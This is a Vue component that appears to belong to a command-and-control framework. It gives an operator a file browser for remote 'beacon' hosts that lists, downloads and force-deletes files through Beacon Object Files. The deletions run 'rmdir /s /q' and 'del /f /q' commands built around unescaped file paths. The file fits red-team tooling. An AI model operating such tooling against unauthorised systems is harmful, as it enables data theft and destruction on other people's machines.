<template>
  <div class="file-browser">
    <div class="browser-toolbar">
      <button class="icon-btn" @click="goUp" :disabled="loading || !hasParent"><ChevronUp :size="14" /></button>
      <div class="path-input">
        <Folder :size="12" class="path-icon" />
        <input v-model="path" @keydown.enter="refreshFiles" :disabled="loading" />
      </div>
      <button class="btn" @click="refreshFiles" :disabled="loading">
        <RefreshCw :size="12" :class="{ spinning: loading }" /> Refresh
      </button>
    </div>

    <div class="browser-content">
      <!-- Left: Parent directory contents -->
      <div class="parent-dir-panel">
        <div class="section-header">
          <FolderOpen :size="12" />
          <span>{{ parentDirName }}</span>
        </div>
        <div class="file-list">
          <div
            v-for="file in parentFiles"
            :key="file.name"
            class="file-item"
            :class="{ active: isCurrentDir(file), 'is-dir': file.is_dir }"
            @click="onParentFileClick(file)"
            @dblclick="onParentFileDblClick(file)"
          >
            <Folder v-if="file.is_dir" :size="14" class="item-icon dir-icon" />
            <FileIcon v-else :size="14" class="item-icon file-icon-svg" />
            <span class="item-name">{{ file.name }}</span>
          </div>
          <div v-if="parentFiles.length === 0 && !loadingParent" class="empty-panel">
            Root directory
          </div>
        </div>
      </div>

      <!-- Right: Current directory contents -->
      <div class="current-dir-panel">
        <div class="section-header">
          <Folder :size="12" />
          <span>{{ currentDirName }}</span>
        </div>
        <div class="file-list-container">
          <table class="file-table">
            <thead>
              <tr>
                <th style="width: 30px"></th>
                <th>Name</th>
                <th style="width: 100px">Size</th>
                <th style="width: 160px">Modified</th>
                <th style="width: 80px">Actions</th>
              </tr>
            </thead>
            <tbody>
              <tr v-for="file in files" :key="file.name" @dblclick="onFileDblClick(file)">
                <td class="file-icon">
                  <Folder v-if="file.is_dir" :size="14" class="dir-icon" />
                  <FileIcon v-else :size="14" class="file-icon-svg" />
                </td>
                <td class="file-name" :class="{ 'is-dir': file.is_dir }">{{ file.name }}</td>
                <td class="file-size">{{ file.is_dir ? '-' : formatSize(file.size) }}</td>
                <td class="file-date">{{ file.modified || '-' }}</td>
                <td class="file-actions">
                  <button v-if="!file.is_dir" class="action-btn" @click="downloadFile(file)" title="Download"><Download :size="12" /></button>
                  <button class="action-btn delete" @click="confirmDeleteFile(file)" title="Delete"><Trash2 :size="12" /></button>
                </td>
              </tr>
              <tr v-if="files.length === 0 && !loading">
                <td colspan="5" class="empty">No files or path not yet explored</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, computed, onMounted, onUnmounted, watch } from 'vue'
import { Folder, FolderOpen, File as FileIcon, ChevronUp, RefreshCw, Download, Trash2 } from 'lucide-vue-next'
import api from '../services/api'
import { useToastStore } from '../stores/toast'
import { useAppStore } from '../stores/app'
import { useModalStore } from '../stores/modal'
import ConfirmModal from './ConfirmModal.vue'
import { auditTaskInput } from '../services/taskAudit'

type FileBrowserCache = { path: string; files: any[]; parentFiles?: any[] }
const fileBrowserCache: Map<string, FileBrowserCache> = (() => {
  const g = globalThis as any
  if (!g.__ghostFileBrowserCache) {
    g.__ghostFileBrowserCache = new Map<string, FileBrowserCache>()
  }
  return g.__ghostFileBrowserCache as Map<string, FileBrowserCache>
})()

const props = defineProps<{ targetId: string }>()
const toast = useToastStore()
const appStore = useAppStore()
const modalStore = useModalStore()

const path = ref('C:\\')
const files = ref<any[]>([])
const loading = ref(false)
const parentFiles = ref<any[]>([])
const loadingParent = ref(false)

// Get parent directory path
const parentPath = computed(() => {
  const p = path.value.replace(/\\+$/, '')
  const parts = p.split('\\').filter(Boolean)
  if (parts.length <= 1) return ''
  parts.pop()
  return parts.join('\\') + '\\'
})

// Check if has parent directory
const hasParent = computed(() => {
  const parts = path.value.split('\\').filter(Boolean)
  return parts.length > 1
})

// Get parent directory name
const parentDirName = computed(() => {
  if (!hasParent.value) return 'Root'
  const p = parentPath.value.replace(/\\+$/, '')
  const parts = p.split('\\').filter(Boolean)
  return parts[parts.length - 1] || parts[0] || 'Root'
})

// Get current directory name
const currentDirName = computed(() => {
  const p = path.value.replace(/\\+$/, '')
  const parts = p.split('\\').filter(Boolean)
  return parts[parts.length - 1] || parts[0] || 'Root'
})

// Check if a file in parent dir is the current directory
const isCurrentDir = (file: any) => {
  if (!file.is_dir) return false
  const currentName = currentDirName.value
  return file.name === currentName
}

// Watch path changes to load parent directory
watch(path, () => {
  if (hasParent.value) {
    loadParentDir()
  } else {
    parentFiles.value = []
  }
}, { immediate: false })

const getInitialPathFromBeacon = () => {
  const beacon = appStore.beacons.find((b: any) => (b.node_id || b.id) === props.targetId)
  const proc = String(beacon?.process || beacon?.process_name || '')
  if (!proc) return 'C:\\'
  const normalized = proc.replace(/\//g, '\\')
  const idx = normalized.lastIndexOf('\\')
  if (idx > 1) return normalized.slice(0, idx + 1)
  return 'C:\\'
}

const encodeBeaconString = (value: string): number[] => {
  const bytes = Array.from(new TextEncoder().encode(value))
  const len = bytes.length + 1
  return [len & 0xff, (len >> 8) & 0xff, ...bytes, 0]
}

const findBof = (pattern: RegExp) => appStore.bofs.find(b => pattern.test(b.name))

const updateCache = () => {
  fileBrowserCache.set(props.targetId, {
    path: path.value,
    files: [...files.value],
    parentFiles: [...parentFiles.value]
  })
}

const pollTaskResult = async (taskId: string, maxRetry = 120): Promise<any> => {
  for (let i = 0; i < maxRetry; i++) {
    try {
      const res = await api.get(`/tasks/${taskId}`, {
        silentError: true,
        validateStatus: (s: number) => s === 200 || s === 404
      } as any)
      if (res.status === 404) {
        await new Promise(resolve => setTimeout(resolve, 1000))
        continue
      }
      if (res.data.success && res.data.data) {
        return res.data.data
      }
    } catch (err: any) {
      throw err
    }
    await new Promise(resolve => setTimeout(resolve, 1000))
  }
  throw new Error('Task timeout')
}

const formatSize = (bytes: number) => {
  if (!bytes) return '0 B'
  const k = 1024; const sizes = ['B', 'KB', 'MB', 'GB']
  const i = Math.floor(Math.log(bytes) / Math.log(k))
  return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i]
}

const loadParentDir = async () => {
  if (!hasParent.value) {
    parentFiles.value = []
    return
  }

  // Check cache first
  const parentCacheKey = `${props.targetId}:${parentPath.value}`
  const cached = fileBrowserCache.get(parentCacheKey)
  if (cached && cached.files) {
    parentFiles.value = [...cached.files]
    return
  }

  loadingParent.value = true
  try {
    const fileListBof = findBof(/^file_list\b/i)
    if (!fileListBof) return

    const res = await api.post('/bof/execute', {
      node_id: props.targetId,
      bof_name: fileListBof.name,
      plugin_name: fileListBof.plugin_name || '',
      args: encodeBeaconString(parentPath.value)
    })
    if (res.data.success) {
      const result = await pollTaskResult(res.data.data, 60)
      if (result.success) {
        parentFiles.value = parseFileListOutput(result.output || '', true)
        // Cache parent directory
        fileBrowserCache.set(parentCacheKey, {
          path: parentPath.value,
          files: [...parentFiles.value]
        })
      }
    }
  } catch (err: any) {
    // Silently fail for parent directory loading
  } finally {
    loadingParent.value = false
  }
}

const refreshFiles = async () => {
  loading.value = true
  try {
    const fileListBof = findBof(/^file_list\b/i)
    if (!fileListBof) {
      toast.error('No file_list BOF found. Upload file_list.o first.')
      return
    }

    await auditTaskInput({
      source: 'file:list',
      nodeId: props.targetId,
      input: path.value
    })
    const res = await api.post('/bof/execute', {
      node_id: props.targetId,
      bof_name: fileListBof.name,
      plugin_name: fileListBof.plugin_name || '',
      args: encodeBeaconString(path.value)
    })
    if (res.data.success) {
      const result = await pollTaskResult(res.data.data, 60)
      if (!result.success) {
        toast.error(result.error || 'File list failed')
        return
      }
      files.value = parseFileListOutput(result.output || '')
      updateCache()
      // Load parent directory after loading current
      if (hasParent.value) {
        loadParentDir()
      }
    }
  } catch (err: any) {
    toast.error(err.message || 'Failed to list files')
  } finally {
    loading.value = false
  }
}

const parseFileListOutput = (output: string, skipPathUpdate = false) => {
  const rows: any[] = []
  const lines = output.split('\n').map(line => line.trim()).filter(Boolean)
  for (const line of lines) {
    if (line.startsWith('CWD:')) {
      const cwd = line.slice(4).trim()
      if (cwd && !skipPathUpdate) path.value = cwd
      continue
    }
    const parts = line.split('\t')
    if (parts.length < 4) continue
    const [type, name, sizeRaw, epochRaw] = parts
    if (name === '.' || name === '..') continue
    const epoch = Number(epochRaw) || 0
    rows.push({
      name,
      is_dir: type === 'D',
      size: Number(sizeRaw) || 0,
      modified: epoch ? new Date(epoch * 1000).toLocaleString() : ''
    })
  }
  return rows
}

const goUp = () => {
  if (!hasParent.value) return
  path.value = parentPath.value
  refreshFiles()
}

const onFileDblClick = (file: any) => {
  if (file.is_dir) {
    path.value = path.value + (path.value.endsWith('\\') ? '' : '\\') + file.name + '\\'
    refreshFiles()
  }
}

const onParentFileClick = (_file: any) => {
  // Single click in parent panel - just highlight
}

const onParentFileDblClick = (file: any) => {
  if (file.is_dir) {
    path.value = parentPath.value + (parentPath.value.endsWith('\\') ? '' : '\\') + file.name + '\\'
    refreshFiles()
  }
}

const downloadFile = async (file: any) => {
  const fullPath = path.value + (path.value.endsWith('\\') ? '' : '\\') + file.name
  try {
    const fileDownloadBof = findBof(/^file_download\b/i)
    if (!fileDownloadBof) {
      toast.error('No file_download BOF found. Upload file_download.o first.')
      return
    }

    await auditTaskInput({
      source: 'file:download',
      nodeId: props.targetId,
      input: fullPath
    })
    const res = await api.post('/bof/execute', {
      node_id: props.targetId,
      bof_name: fileDownloadBof.name,
      plugin_name: fileDownloadBof.plugin_name || '',
      args: encodeBeaconString(fullPath)
    })
    const result = await pollTaskResult(res.data.data, 120)
    if (!result.success) {
      toast.error(result.error || 'Download failed')
      return
    }

    let content = result.output || ''
    const firstLineIdx = content.indexOf('\n')
    if (firstLineIdx >= 0 && content.slice(0, firstLineIdx).startsWith('=== FILE:')) {
      content = content.slice(firstLineIdx + 1)
    }
    const bin = atob(content)
    const bytes = new Uint8Array(bin.length)
    for (let i = 0; i < bin.length; i++) {
      bytes[i] = bin.charCodeAt(i)
    }
    const blob = new Blob([bytes], { type: 'application/octet-stream' })
    const link = document.createElement('a')
    link.href = URL.createObjectURL(blob)
    link.download = file.name
    link.click()
    URL.revokeObjectURL(link.href)
    toast.success(`Downloaded ${file.name}`)
  } catch (err: any) {
    toast.error(err.message || 'Download failed')
  }
}

const deleteFile = async (file: any) => {
  const fullPath = path.value + (path.value.endsWith('\\') ? '' : '\\') + file.name
  try {
    const cmdBof = findBof(/^cmd_exec\b/i)
    if (!cmdBof) {
      toast.error('No cmd_exec BOF found. Upload cmd_exec.o first.')
      return
    }
    const command = file.is_dir ? `rmdir /s /q "${fullPath}"` : `del /f /q "${fullPath}"`
    await auditTaskInput({
      source: 'file:delete',
      nodeId: props.targetId,
      input: command
    })
    const res = await api.post('/bof/execute', {
      node_id: props.targetId,
      bof_name: cmdBof.name,
      plugin_name: cmdBof.plugin_name || '',
      args: encodeBeaconString(command)
    })
    const result = await pollTaskResult(res.data.data, 60)
    if (!result.success) {
      toast.error(result.error || 'Delete failed')
      return
    }
    toast.success(`Deleted ${file.name}`)
    await refreshFiles()
  } catch (err: any) {
    toast.error(err.message || 'Delete failed')
  }
}

const confirmDeleteFile = (file: any) => {
  modalStore.open(ConfirmModal, {
    title: 'Delete File',
    message: `Delete "${file.name}" on target ${props.targetId}?`,
    confirmText: 'Delete',
    type: 'danger',
    onResolve: async () => {
      await deleteFile(file)
    }
  })
}

onMounted(async () => {
  const cached = fileBrowserCache.get(props.targetId)
  if (cached) {
    path.value = cached.path
    files.value = [...cached.files]
    if (cached.parentFiles) {
      parentFiles.value = [...cached.parentFiles]
    }
  } else {
    path.value = getInitialPathFromBeacon()
    await refreshFiles()
  }
  window.addEventListener('ghost:sync', onSync as EventListener)
})
onUnmounted(() => {
  window.removeEventListener('ghost:sync', onSync as EventListener)
})

const onSync = async () => {
  await refreshFiles()
}
</script>

<style scoped>
.file-browser { display: flex; flex-direction: column; height: 100%; background: var(--bg); }

/* Toolbar */
.browser-toolbar { height: 36px; display: flex; align-items: center; gap: 8px; padding: 0 12px; background: var(--bg-2); border-bottom: 1px solid var(--bd); }
.icon-btn { display: flex; align-items: center; justify-content: center; width: 28px; height: 24px; border-radius: 3px; border: 1px solid var(--bd); background: var(--bg-3); color: var(--tx-2); cursor: pointer; transition: all 0.15s; }
.icon-btn:hover:not(:disabled) { background: var(--bg-4); color: var(--tx); }
.icon-btn:disabled { opacity: 0.4; cursor: not-allowed; }
.path-input { flex: 1; display: flex; align-items: center; background: var(--bg-3); border: 1px solid var(--bd); border-radius: 4px; padding: 0 8px; height: 24px; }
.path-icon { color: var(--amber); margin-right: 8px; }
.path-input input { background: transparent; border: none; color: var(--tx); font-size: 11px; font-family: var(--font-mono); width: 100%; outline: none; }
.btn { display: flex; align-items: center; gap: 6px; padding: 4px 10px; border-radius: 3px; border: 1px solid var(--bd); background: var(--bg-3); color: var(--tx-2); cursor: pointer; font-size: 11px; transition: all 0.15s; }
.btn:hover:not(:disabled) { background: var(--bg-4); color: var(--tx); }
.btn:disabled { opacity: 0.4; cursor: not-allowed; }

/* Main content: left-right layout */
.browser-content { display: flex; flex: 1; overflow: hidden; }

/* Left panel: parent directory */
.parent-dir-panel { width: 280px; border-right: 1px solid var(--bd); display: flex; flex-direction: column; background: var(--bg-2); }
.section-header { display: flex; align-items: center; gap: 8px; padding: 10px 12px; background: var(--bg-3); border-bottom: 1px solid var(--bd); font-size: 11px; font-weight: 600; color: var(--tx); }
.file-list { flex: 1; overflow-y: auto; padding: 4px; }
.file-item { display: flex; align-items: center; gap: 8px; padding: 6px 10px; cursor: pointer; font-size: 11px; color: var(--tx-2); transition: all 0.15s; border-radius: 4px; margin-bottom: 2px; }
.file-item:hover { background: var(--bg-3); color: var(--tx); }
.file-item.active { background: var(--bg-4); color: var(--tx); font-weight: 600; border: 1px solid var(--pri); }
.file-item.is-dir { color: var(--blue); }
.file-item.is-dir.active { color: var(--pri); }
.item-icon { flex-shrink: 0; }
.file-item .dir-icon { color: var(--amber); }
.file-item .file-icon-svg { color: var(--tx-3); }
.item-name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-family: var(--font-mono); }
.empty-panel { padding: 20px; text-align: center; color: var(--tx-4); font-size: 11px; }

/* Right panel: current directory */
.current-dir-panel { flex: 1; display: flex; flex-direction: column; background: var(--bg); }
.file-list-container { flex: 1; overflow-y: auto; }
.file-table { width: 100%; border-collapse: collapse; font-size: 11px; font-family: var(--font-mono); }
.file-table th { text-align: left; padding: 8px 12px; background: var(--bg-3); position: sticky; top: 0; color: var(--tx-3); text-transform: uppercase; font-size: 10px; z-index: 1; border-bottom: 1px solid var(--bd); }
.file-table td { padding: 6px 12px; border-bottom: 1px solid var(--bd); vertical-align: middle; }
.file-table tbody tr:hover { background: var(--bg-4); cursor: pointer; }
.file-icon { color: var(--tx-3); }
.file-table .dir-icon { color: var(--amber); }
.file-icon-svg { color: var(--tx-3); }
.is-dir { color: var(--blue); font-weight: 600; }
.file-size, .file-date { color: var(--tx-3); }
.file-actions { display: flex; gap: 4px; }
.action-btn { background: transparent; border: 1px solid var(--bd); color: var(--tx-3); padding: 4px; border-radius: 3px; cursor: pointer; transition: all 0.15s; }
.action-btn:hover { border-color: var(--tx-2); color: var(--tx); }
.action-btn.delete:hover { border-color: var(--red); color: var(--red); }
.empty { text-align: center; padding: 40px; color: var(--tx-4); }

/* Animations */
.spinning { animation: spin 1s linear infinite; }
@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
</style>
